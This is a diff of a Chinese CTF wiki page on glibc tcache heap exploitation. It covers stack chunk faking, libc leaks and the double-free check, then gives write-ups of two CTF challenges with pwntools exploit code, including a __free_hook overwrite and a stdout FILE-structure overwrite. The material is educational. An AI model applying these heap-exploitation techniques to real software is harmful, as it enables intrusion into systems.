 <p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的chunk，然后去 free 掉他，我们会发现</p>
-<div class="codehilite"><pre><span></span>gdb-peda$ heapinfo
+<div class="codehilite"><pre><span></span><code>gdb-peda$ heapinfo
 <span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
 <span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
 <span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
@@ -6168,14 +6168,14 @@ tcache 的第一条链放入了一个 chunk</p>
        last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span>
             unsortbin: 0x0
 <span class="o">(</span>0x90<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x7fffffffe510 --&gt; 0x401340
-</pre></div>
+</code></pre></div>
 
 <p>Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
 <h4 id="smallbin-unlink">smallbin unlink<a class="headerlink" href="#smallbin-unlink" title="Permanent link">&para;</a></h4>
 <p>在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p>
 <h4 id="libc-leak">libc leak<a class="headerlink" href="#libc-leak" title="Permanent link">&para;</a></h4>
 <p>在以前的libc 版本中，我们只需这样：</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
@@ -6185,10 +6185,10 @@ tcache 的第一条链放入了一个 chunk</p>
     <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
 <span class="p">}</span> 
-</pre></div>
+</code></pre></div>
 
 <p>但是在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
@@ -6207,10 +6207,10 @@ tcache 的第一条链放入了一个 chunk</p>
     <span class="c1">// a is put in an unsorted bin because the tcache bin of this size is full</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
 <span class="p">}</span> 
-</pre></div>
+</code></pre></div>
 
 <p>之后，我们就可以 leak libc 了。</p>
-<div class="codehilite"><pre><span></span>gdb-peda$ heapinfo
+<div class="codehilite"><pre><span></span><code>gdb-peda$ heapinfo
 <span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
 <span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
 <span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
@@ -6234,11 +6234,11 @@ addr                prev                size                 status             
 0x555555559490      0x0                 0x110                Used                None              None
 0x5555555595a0      0x0                 0x110                Used                None              None
 0x5555555596b0      0x0                 0x110                Used                None              None
-</pre></div>
+</code></pre></div>
 
 <h3 id="0x04-tcache-check">0x04 Tcache Check<a class="headerlink" href="#0x04-tcache-check" title="Permanent link">&para;</a></h3>
 <p>在最新的 libc 的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7">commit</a> 中更新了 Tcache 的 double free 的check：</p>
-<div class="codehilite"><pre><span></span><span class="n">index</span> <span class="mi">6</span><span class="n">d7a6a8</span><span class="p">..</span><span class="n">f730d7a</span> <span class="mi">100644</span> <span class="p">(</span><span class="n">file</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="n">index</span> <span class="mi">6</span><span class="n">d7a6a8</span><span class="p">..</span><span class="n">f730d7a</span> <span class="mi">100644</span> <span class="p">(</span><span class="n">file</span><span class="p">)</span>
 <span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
 <span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
 <span class="err">@@</span> <span class="o">-</span><span class="mi">2967</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">2967</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="n">mremap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">new_size</span><span class="p">)</span>
@@ -6297,21 +6297,21 @@ addr                prev                size                 status             
      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span>
         <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span>
         <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。</p>
 <h3 id="0x05-the-pwn-of-ctf">0x05 The pwn of CTF<a class="headerlink" href="#0x05-the-pwn-of-ctf" title="Permanent link">&para;</a></h3>
 <h4 id="challenge-1-lctf2018-pwn-easy_heap">Challenge 1 : LCTF2018 PWN easy_heap<a class="headerlink" href="#challenge-1-lctf2018-pwn-easy_heap" title="Permanent link">&para;</a></h4>
 <h5 id="_1">基本信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h5>
 <p>远程环境中的 libc 是 libc-2.27.so ，所以堆块申请释放过程中需要考虑 Tcache 。</p>
-<div class="codehilite"><pre><span></span>zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
+<div class="codehilite"><pre><span></span><code>zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/lctf2018/easy/easy_heap&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-</pre></div>
+</code></pre></div>
 
 <h5 id="_2">基本功能<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h5>
 <ol>
@@ -6322,15 +6322,15 @@ addr                prev                size                 status             
 </ol>
 <p>功能较为简单。</p>
 <p>记录一个 chunk 结构的结构体：</p>
-<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">Chunk</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="n">Chunk</span> <span class="p">{</span>
     <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
 <span class="p">};</span>
-</pre></div>
+</code></pre></div>
 
 <p>使用了一个在堆上分配的结构来记录所有 <code>Chunk</code> 结构体，一共可以分配 10 个块。</p>
 <p>程序的读入输入函数存在一个 null-byte-overflow 漏洞 ，具体见如下代码</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
   <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
@@ -6355,7 +6355,7 @@ addr                prev                size                 status             
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="_3">利用思路<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h5>
 <p>由于存在 tcache ，所以利用过程中需要考虑到 tcache 的存在。</p>
@@ -6377,7 +6377,7 @@ addr                prev                size                 status             
 <h5 id="_4">利用步骤<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h5>
 <h6 id="unsorted-bin-chunk">重排堆块结构，释放出 unsorted bin chunk<a class="headerlink" href="#unsorted-bin-chunk" title="Permanent link">&para;</a></h6>
 <p>由于本题只有 10 个可分配块数量，而整个过程中我们需要用到 3 个 unsorted bin 的 chunk ，加上 7 个 tcache 的 chunk ，所以需要进行一下重排，将一个 tcache 的 chunk 放到 3 个 unsorted bin chunk 和 top chunk 之间，否则会触发 top 的合并。</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># step 1: get three unsortedbin chunks</span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># step 1: get three unsortedbin chunks</span>
     <span class="c1"># note that to avoid top consolidation, we need to arrange them like:</span>
     <span class="c1"># tcache * 6 -&gt; unsortd  * 3 -&gt; tcache</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
@@ -6392,10 +6392,10 @@ addr                prev                size                 status             
     <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span>
         <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>重分配后的堆结构：</p>
-<div class="codehilite"><pre><span></span>+-----+
+<div class="codehilite"><pre><span></span><code>+-----+
 |     | &lt;-- tcache perthread 结构体
 +-----+
 | ... | &lt;-- 6 个 tcache 块
@@ -6410,11 +6410,11 @@ addr                prev                size                 status             
 +-----+
 | top |
 |  .. |
-</pre></div>
+</code></pre></div>
 
 <h6 id="null">按照解析中的步骤进行 NULL 字节溢出触发<a class="headerlink" href="#null" title="Permanent link">&para;</a></h6>
 <p>为了触发 NULL 字节溢出，我们需要使得解析中的 B 块可以溢出到 C 块中。由于题目中没有 edit 功能，所以我们需要让 B 块进入 tcache 中，这样就可以在释放后再分配出来，且由于 tcache 没有太多变化和检查，会较为稳定。</p>
-<div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
         <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>
 
     <span class="c1"># rearrange to take second unsorted bin into tcache chunk, but leave first </span>
@@ -6427,15 +6427,15 @@ addr                prev                size                 status             
         <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
     <span class="c1"># move second into tcache</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>之后进行 A 块的释放（用来提供有效的可以进行 unlink 的 fd 和 bk 值）</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># delete first to provide valid fd &amp; bk</span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># delete first to provide valid fd &amp; bk</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>现在堆块结构如下：</p>
-<div class="codehilite"><pre><span></span>+-----+
+<div class="codehilite"><pre><span></span><code>+-----+
 |     | &lt;-- tcache perthread 结构体
 +-----+
 | ... | &lt;-- 6 个 tcache 块 (free)
@@ -6450,25 +6450,25 @@ addr                prev                size                 status             
 +-----+
 | top |
 |  .. |
-</pre></div>
+</code></pre></div>
 
 <p>tcache bin 链表中，第一位的是 B 块，所以现在可以将 B 块进行分配，且进行 NULL 字符溢出。</p>
-<div class="codehilite"><pre><span></span>    <span class="n">new</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;0 - overflow&#39;</span><span class="p">)</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code>    <span class="n">new</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;0 - overflow&#39;</span><span class="p">)</span>
+</code></pre></div>
 
 <p>在之后的步骤中，我们需要 A 处于 unsorted bin 释放状态，B 处于分配状态，C 处于分配状态，且最后可以在 tcache 块 7 个全满的情况下进行释放（触发合并），所以我们需要 7 个 tcache 都被 free 掉。</p>
 <p>此时由于 B 块被分配为 tcache 块了，所以需要将防止 top 合并的 tcache 块释放掉。</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># fill up tcache</span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># fill up tcache</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>之后就可以将 C 块释放，进行合并。</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># trigger</span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># trigger</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>合并后的结构：</p>
-<div class="codehilite"><pre><span></span>+-----+
+<div class="codehilite"><pre><span></span><code>+-----+
 |     | &lt;-- tcache perthread 结构体
 +-----+
 | ... | &lt;-- 6 个 tcache 块 (free)
@@ -6483,11 +6483,11 @@ addr                prev                size                 status             
 +-----+
 | top |
 |  .. |
-</pre></div>
+</code></pre></div>
 
 <h6 id="_5">地址泄露<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h6>
 <p>此时的堆已经出现交叉了，接下来将 A 大小从 unsorted bin 中分配出来，就可以使得 libc 地址落入 B 中：</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># step 3: leak, fill up </span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># step 3: leak, fill up </span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
         <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>
     <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;8 - fillup&#39;</span><span class="p">)</span>
@@ -6496,10 +6496,10 @@ addr                prev                size                 status             
     <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)))</span>
     <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
-</pre></div>
+</code></pre></div>
 
 <p>堆结构：</p>
-<div class="codehilite"><pre><span></span>+-----+
+<div class="codehilite"><pre><span></span><code>+-----+
 |     | &lt;-- tcache perthread 结构体
 +-----+
 | ... | &lt;-- 6 个 tcache 块 (free)
@@ -6514,11 +6514,11 @@ addr                prev                size                 status             
 +-----+
 | top |
 |  .. |
-</pre></div>
+</code></pre></div>
 
 <h6 id="tcache-uaf-attack">tcache UAF attack<a class="headerlink" href="#tcache-uaf-attack" title="Permanent link">&para;</a></h6>
 <p>接下来，由于 B 块已经是 free 状态，但是又有指针指向，所以我们只需要再次分配，使得有两个指针指向 B 块，之后在 tcache 空间足够时，利用 tcache 进行 double free ，进而通过 UAF 攻击 free hook 即可。</p>
-<div class="codehilite"><pre><span></span>    <span class="c1"># step 4: constrecvuntilct UAF, write into __free_hook</span>
+<div class="codehilite"><pre><span></span><code>    <span class="c1"># step 4: constrecvuntilct UAF, write into __free_hook</span>
     <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;9 - next&#39;</span><span class="p">)</span>
     <span class="c1"># these two provides sendlineots for tcache</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
@@ -6535,10 +6535,10 @@ addr                prev                size                 status             
     <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
     <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="exploit">完整 exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h5>
-<div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#! /usr/bin/env python2</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="c1"># vim:fenc=utf-8</span>
 <span class="c1">#</span>
@@ -6652,12 +6652,12 @@ addr                prev                size                 status             
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="challenge-2-hitcon-2018-pwn-baby_tcache">Challenge 2 : HITCON 2018 PWN baby_tcache<a class="headerlink" href="#challenge-2-hitcon-2018-pwn-baby_tcache" title="Permanent link">&para;</a></h4>
 <h5 id="_6">基本信息<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h5>
 <p>远程环境中的 libc 是 libc-2.27.so 和上面的题目一样。</p>
-<div class="codehilite"><pre><span></span>zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
+<div class="codehilite"><pre><span></span><code>zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/hitcon2018/pwn1/baby_tcache&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -6665,13 +6665,13 @@ addr                prev                size                 status             
     NX:       NX enabled
     PIE:      PIE enabled
     FORTIFY:  Enabled
-</pre></div>
+</code></pre></div>
 
 <h5 id="_7">基本功能<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
 <p>程序的功能很简单 ，就2个功能 ，一个功能为 New 申请使用内存不大于 0x2000 的 chunk ，总共可以申请 10 块 ，通过 bss 段上的一个全局数组 arr 来管理申请的 chunk ，同时 bss 段上的数组 size_arr 来存储相应 chunk 的申请大小 size 。</p>
 <p>程序的另外一个功能就是 delete ，删除所选的堆块 ，删除之前会事先把 chunk 的内容区域按照申请的 size 覆盖成 0xdadadada 。</p>
 <p>程序的漏洞代码在功能 New 的时候 ，写完数据后 ，有一个 null-byte 溢出漏洞 ，具体如下 ：</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">new</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">new</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax</span>
   <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
@@ -6703,7 +6703,7 @@ addr                prev                size                 status             
   <span class="n">size_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="_8">利用思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
 <p>程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。</p>
@@ -6718,7 +6718,7 @@ addr                prev                size                 status             
 </ol>
 <p>思路 2 中涉及到的相关代码：</p>
 <p><code>puts</code> 函数最终会调用到该函数，我们需要满足部分 flag 要求使其能够进入 <code>_IO_do_write</code>：</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span>
 <span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> 
@@ -6738,10 +6738,10 @@ addr                prev                size                 status             
                                                 <span class="c1">// 存在有价值的地址 （libc 地址）则可进行泄露</span>
                                                 <span class="c1">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span>
              <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>进入后的部分：</p>
-<div class="codehilite"><pre><span></span><span class="k">static</span>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span>
 <span class="n">_IO_size_t</span>
 <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">to_do</span><span class="p">)</span>
 <span class="p">{</span>
@@ -6758,20 +6758,20 @@ addr                prev                size                 status             
      <span class="p">............</span>
     <span class="p">}</span>
   <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span> <span class="c1">// 这里真正进行 write</span>
-</pre></div>
+</code></pre></div>
 
 <p>可以看到，为调用到目标函数位置，需要满足部分 flags 要求，具体需要满足的 flags ：</p>
-<div class="codehilite"><pre><span></span><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span>  <span class="c1">// Magic number</span>
+<div class="codehilite"><pre><span></span><code><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span>  <span class="c1">// Magic number</span>
 <span class="n">_flags</span> <span class="o">&amp;</span> <span class="o">=</span> <span class="o">~</span><span class="n">_IO_NO_WRITES</span> <span class="c1">// _flags = 0xfbad0000</span>
 <span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_CURRENTLY_PUTTING</span> <span class="c1">// _flags = 0xfbad0800</span>
 <span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_IS_APPENDING</span> <span class="c1">// _flags = 0xfbad1800</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="_9">操作过程<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
 <ul>
 <li>形成 overlapping chunk</li>
 </ul>
-<div class="codehilite"><pre><span></span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
+<div class="codehilite"><pre><span></span><code>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>   <span class="c1"># 1</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># 2</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># 3</span>
@@ -6785,9 +6785,9 @@ addr                prev                size                 status             
     <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>  <span class="c1"># backward coeleacsing</span>
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span>gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
+<div class="codehilite"><pre><span></span><code>gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
 0x555d56ed6250: 0x0000000000000000  0x0000000000000b61  ( free(#5) ==&gt; merge into #0 get 0x660+0x500=0xb60 chunk ) #0
 0x555d56ed6260: 0x00007fa8a0a3fca0  0x00007fa8a0a3fca0
 0x555d56ed6270: 0x0000000000000000  0x0000000000000000
@@ -6811,21 +6811,21 @@ addr                prev                size                 status             
 ...............
 0x555d56ed68b0: 0x0000000000000660  0x0000000000000500   #5
 ...............
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>改写文件结构体的相关字段</li>
 </ul>
-<div class="codehilite"><pre><span></span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x9</span><span class="o">+</span><span class="mh">0x34</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x9</span><span class="o">+</span><span class="mh">0x34</span><span class="p">)</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x60\x07</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># corrupt the fd</span>
 
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># overwrite the file-structure !!!</span>
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span>gdb-peda$ x/20xg stdout
+<div class="codehilite"><pre><span></span><code>gdb-peda$ x/20xg stdout
 0x7fa8a0a40760 &lt;_IO_2_1_stdout_&gt;:   0x00000000fbad1800(!!!) 0x0000000000000000(!!!)
 0x7fa8a0a40770 &lt;_IO_2_1_stdout_+16&gt;:    0x0000000000000000(!!!) 0x0000000000000000(!!!)
 0x7fa8a0a40780 &lt;_IO_2_1_stdout_+32&gt;:    0x00007fa8a0a40700(!!!_IO_write_base)   0x00007fa8a0a407e3
